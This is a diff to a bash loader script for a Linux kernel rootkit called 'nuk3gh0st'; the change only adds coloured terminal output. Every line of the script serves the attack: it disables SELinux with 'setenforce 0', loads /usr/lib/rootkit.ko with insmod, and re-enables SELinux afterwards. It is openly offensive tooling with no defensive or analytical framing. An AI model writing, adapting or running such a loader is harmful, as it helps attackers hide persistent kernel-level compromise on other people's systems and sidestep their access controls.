@@ -1,23 +1,29 @@
 #!/bin/bash
-echo "#################################"
-echo "# Loading nuk3gh0st LKM rootkit #"
-echo "#################################"
+
+green='\e[0;32m'
+red='\e[0;31m'
+endColor='\e[0m'
+item=${green}[*]${endColor}
+
+echo -e "${green}#################################${endColor}"
+echo -e "${green}# Loading nuk3gh0st LKM rootkit #${endColor}"
+echo -e "${green}#################################${endColor}"
 echo ""
-echo "Checking if SELINUX is enabled..."
+echo -e "${item}Checking if SELINUX is enabled..."
 if [ -f /usr/sbin/setenforce ]; then
-	echo "SELINUX is enabled"
-	echo "Disabling SELINUX temporarily"
-	echo "cmd: setenforce 0"
+	echo -e "${item}SELINUX is enabled"
+	echo -e "${item}Disabling SELINUX temporarily"
+	echo -e "${red}cmd: setenforce 0${endColor}"
 	setenforce 0
-	echo "Loading nuk3gh0st LKM rootkit"
-	echo "cmd: insmod /usr/lib/rootkit.ko"
+	echo -e "${item}Loading nuk3gh0st LKM rootkit"
+	echo -e "${red}cmd: insmod /usr/lib/rootkit.ko${endColor}"
         insmod /usr/lib/rootkit.ko
-	echo "Reenabling SELINUX"
-	echo "cmd: setenforce 1"
+	echo -e "${item}Reenabling SELINUX"
+	echo -e "${red}cmd: setenforce 1${endColor}"
 	setenforce 1
 else
-	echo "SELINUX is disabled"
-	echo "Loading nuk3gh0st LKM rootkit"
-	echo "cmd: insmod /usr/lib/rootkit.ko"
+	echo -e "${item}SELINUX is disabled"
+	echo -e "${item}Loading nuk3gh0st LKM rootkit"
+	echo -e "${red}cmd: insmod /usr/lib/rootkit.ko${endColor}"
         insmod /usr/lib/rootkit.ko
 fi
